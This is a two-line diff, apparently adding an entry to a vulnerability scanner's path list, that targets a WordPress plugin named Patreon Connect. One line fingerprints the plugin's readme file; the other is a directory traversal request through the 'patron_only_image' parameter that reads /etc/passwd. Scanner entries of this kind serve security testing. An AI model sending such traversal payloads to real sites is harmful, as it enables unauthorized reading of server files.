@@ -1,0 +1,2 @@
+/wp-content/plugins/patreon-connect/readme.txt
+/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image
